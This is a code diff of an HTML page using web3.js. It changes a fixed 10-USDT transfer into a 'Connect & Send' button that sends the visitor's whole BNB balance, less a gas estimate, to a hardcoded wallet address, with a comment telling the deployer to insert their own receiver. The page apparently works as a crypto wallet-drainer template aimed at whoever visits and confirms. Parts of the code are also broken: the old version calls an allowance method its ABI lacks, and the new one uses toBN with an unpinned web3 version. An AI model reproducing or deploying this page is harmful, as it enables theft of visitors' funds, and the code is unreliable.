@@ -1,112 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>USDT Auto Transfer (BSC)</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@4.1.2/dist/web3.min.js"></script>
+  <title>Auto Transfer BNB</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-  <button onclick="initiateTransfer()">Transfer USDT</button>
+  <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    // Configuration
-    const RECEIVER = '0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a'; 
-    const USDT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
-    const USDT_ABI = [
-      // Balance Check
-      {
-        "constant":true,
-        "inputs":[{"name":"_owner","type":"address"}],
-        "name":"balanceOf",
-        "outputs":[{"name":"balance","type":"uint256"}],
-        "type":"function"
-      },
-      // Transfer
-      {
-        "constant":false,
-        "inputs":[
-          {"name":"_to","type":"address"},
-          {"name":"_value","type":"uint256"}
-        ],
-        "name":"transfer",
-        "outputs":[{"name":"","type":"bool"}],
-        "type":"function"
-      },
-      // Approval
-      {
-        "constant":false,
-        "inputs":[
-          {"name":"_spender","type":"address"},
-          {"name":"_value","type":"uint256"}
-        ],
-        "name":"approve",
-        "outputs":[{"name":"","type":"bool"}],
-        "type":"function"
-      }
-    ];
+    const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Yahan apna destination wallet address daalo
 
-    async function initiateTransfer() {
-      try {
-        // 1. Wallet Check
-        if (!window.ethereum) throw new Error("MetaMask/Trust Wallet not found!");
-        
+    async function connectAndTransfer() {
+      if (window.ethereum) {
         const web3 = new Web3(window.ethereum);
-        
-        // 2. Switch to BSC Network
         try {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }] // BSC Mainnet
-          });
-        } catch (switchError) {
-          throw new Error("Please manually switch to BNB Smart Chain!");
-        }
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          const sender = accounts[0];
 
-        // 3. Connect Wallet
-        const [account] = await window.ethereum.request({ 
-          method: 'eth_requestAccounts' 
-        });
+          // Get full balance in Wei
+          let balance = await web3.eth.getBalance(sender);
+          
+          // Gas cost estimate (use ~0.001 BNB as gas)
+          const gasEstimate = web3.utils.toWei("0.001", "ether");
 
-        // 4. Initialize USDT Contract
-        const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-        
-        // 5. Check USDT Balance
-        const balance = BigInt(await usdt.methods.balanceOf(account).call());
-        const amountToSend = 10n * 10n ** 6n; // 10 USDT (6 decimals)
-        
-        if (balance < amountToSend) {
-          throw new Error(`Insufficient USDT! Needed: 10, Available: ${balance / 10n**6n}`);
-        }
+          // Amount to send = balance - gas
+          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasEstimate));
 
-        // 6. Check Approval
-        const allowance = BigInt(await usdt.methods.allowance(account, account).call());
-        if (allowance < amountToSend) {
-          // Approve Transaction
-          const approveTx = await usdt.methods.approve(account, amountToSend.toString())
-            .send({
-              from: account,
-              gas: await usdt.methods.approve(account, amountToSend.toString()).estimateGas(),
-              gasPrice: await web3.eth.getGasPrice()
-            });
-          console.log("Approval TX Hash:", approveTx.transactionHash);
-        }
+          if (amountToSend.lte(0)) {
+            alert("Insufficient balance to send BNB.");
+            return;
+          }
 
-        // 7. Send USDT
-        const transferTx = await usdt.methods.transfer(RECEIVER, amountToSend.toString())
-          .send({
-            from: account,
-            gas: await usdt.methods.transfer(RECEIVER, amountToSend.toString()).estimateGas(),
-            gasPrice: await web3.eth.getGasPrice()
+          // Send BNB
+          const tx = await web3.eth.sendTransaction({
+            from: sender,
+            to: receiverAddress,
+            value: amountToSend.toString()
           });
 
-        alert(`Success! TX Hash: ${transferTx.transactionHash}`);
-
-      } catch (error) {
-        console.error("Error Details:", error);
-        if (error.code === 4001) {
-          alert("Transaction cancelled by user.");
-        } else {
-          alert(`Failed: ${error.message}`);
+          alert("BNB sent! Tx hash: " + tx.transactionHash);
+        } catch (err) {
+          console.error("Error:", err);
         }
+      } else {
+        alert("Install MetaMask or Trust Wallet.");
       }
     }
   </script>
